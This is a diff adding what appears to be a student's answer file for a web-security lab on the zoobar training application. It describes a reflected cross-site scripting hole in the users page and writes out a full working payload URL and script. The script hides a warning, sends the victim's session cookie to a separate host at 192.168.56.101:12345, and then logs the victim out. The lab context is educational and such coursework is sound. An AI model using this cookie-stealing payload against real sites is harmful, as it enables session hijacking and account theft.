@@ -1,0 +1,19 @@
+## Place your answers here.
+
+Ex-1:
+`````
+User input field in users page has cross-site scripting vulnerability, as in the input user field requested username is filled
+in its value directly within quotes. So using query string this vulnerability can be exploited as follows:
+
+http://localhost:8080/zoobar/index.cgi/users?user=" style="visibility:hidden;width:0pt;"><script>(new Image()).src="http://192.168.56.101:12345?payload="+encodeURIComponent(document.cookie.split("#")[1])+"&roll=14785&random="+Math.random()+"&timestamp="+Date.now();document.addEventListener("DOMContentLoaded",function(){document.getElementById("warning").innerHTML="";setTimeout(function(){(new Image()).src="http://localhost:8080/zoobar/index.cgi/logout";}, 1500)});</script><input type="text
+
+Javascript code used:
+<script>
+(new Image()).src="http://192.168.56.101:12345?payload="+encodeURIComponent(document.cookie.split("#")[1])+
+                  "&roll=14785&random="+Math.random()+"&timestamp="+Date.now();
+document.addEventListener("DOMContentLoaded",function(){
+  document.getElementById("warning").innerHTML="";
+  setTimeout(function(){
+  (new Image()).src="http://localhost:8080/zoobar/index.cgi/logout";}, 1500)
+  });
+</script>
